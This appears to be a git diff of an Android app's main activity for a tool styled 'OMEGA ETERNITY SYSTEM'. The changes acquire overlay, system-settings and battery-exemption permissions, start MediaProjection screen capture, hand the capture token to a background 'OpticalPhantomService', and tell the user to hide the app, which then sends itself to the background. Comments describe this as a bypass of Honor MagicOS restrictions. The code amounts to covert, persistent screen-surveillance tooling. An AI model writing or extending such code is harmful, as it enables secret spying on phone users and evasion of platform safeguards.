@@ -37,7 +37,7 @@ public class MainActivity extends Activity {
         layout.setGravity(Gravity.CENTER);
 
         tv = new TextView(this);
-        tv.setText("OMEGA ETERNITY SYSTEM\nStatus: Awaiting Privilege Escalation...");
+        tv.setText("OMEGA ETERNITY SYSTEM\nHonor MagicOS Bypass Ready...");
         tv.setTextColor(Color.GREEN);
         tv.setTextSize(18f);
         tv.setGravity(Gravity.CENTER);
@@ -61,49 +61,27 @@ public class MainActivity extends Activity {
             startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())), OVERLAY_REQ);
             return;
         }
-
-        // [OMEGA PRIVILEGE] ĐÒI QUYỀN THAY ĐỔI CÀI ĐẶT HỆ THỐNG
         if (!Settings.System.canWrite(this)) {
-            Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
-            intent.setData(Uri.parse("package:" + getPackageName()));
-            startActivityForResult(intent, WRITE_SETTINGS_REQ);
+            startActivityForResult(new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS, Uri.parse("package:" + getPackageName())), WRITE_SETTINGS_REQ);
             return;
         }
-
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                 ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.POST_NOTIFICATIONS}, NOTIFICATION_REQ);
                 return;
             }
         }
-
         PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-            intent.setData(Uri.parse("package:" + getPackageName()));
-            startActivityForResult(intent, BATTERY_REQ);
+            startActivityForResult(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:" + getPackageName())), BATTERY_REQ);
             return;
         }
-
         startCapture();
     }
 
     private void startCapture() {
-        if (isMyServiceRunning(OpticalPhantomService.class)) {
-            tv.setText("[STATUS] SYSTEM IMMORTAL.\nHide this app.");
-            moveTaskToBack(true);
-            return;
-        }
         MediaProjectionManager mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
         startActivityForResult(mgr.createScreenCaptureIntent(), MEDIA_REQ);
-    }
-
-    private boolean isMyServiceRunning(Class<?> serviceClass) {
-        android.app.ActivityManager manager = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-        for (android.app.ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
-            if (serviceClass.getName().equals(service.service.getClassName())) return true;
-        }
-        return false;
     }
 
     @Override
@@ -118,13 +96,21 @@ public class MainActivity extends Activity {
         if (requestCode == OVERLAY_REQ || requestCode == BATTERY_REQ || requestCode == WRITE_SETTINGS_REQ) {
             checkPermissionsAndStart();
         } else if (requestCode == MEDIA_REQ && resultCode == RESULT_OK) {
-            OpticalPhantomService.mResultCode = resultCode;
-            OpticalPhantomService.mResultIntent = data;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(new Intent(this, OpticalPhantomService.class));
-            else startService(new Intent(this, OpticalPhantomService.class));
+            // [OMEGA INTENT INJECTION] Truyền Token trực tiếp, KHÔNG dùng biến static
+            Intent serviceIntent = new Intent(this, OpticalPhantomService.class);
+            serviceIntent.putExtra("CODE", resultCode);
+            serviceIntent.putExtra("DATA", data);
             
-            tv.setText("[STATUS] NEURAL SYNC ACTIVE.\nSystem Privilege Escalated.");
-            moveTaskToBack(true);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            } else {
+                startService(serviceIntent);
+            }
+            
+            tv.setText("[STATUS] NEURAL SYNC ACTIVE.\nMagicOS Bypass Engaged.\nHide this app now.");
+            
+            // Delay 1.5 giây để MagicOS kịp "nuốt" token trước khi ẩn app
+            new android.os.Handler().postDelayed(() -> moveTaskToBack(true), 1500); 
         }
     }
 }
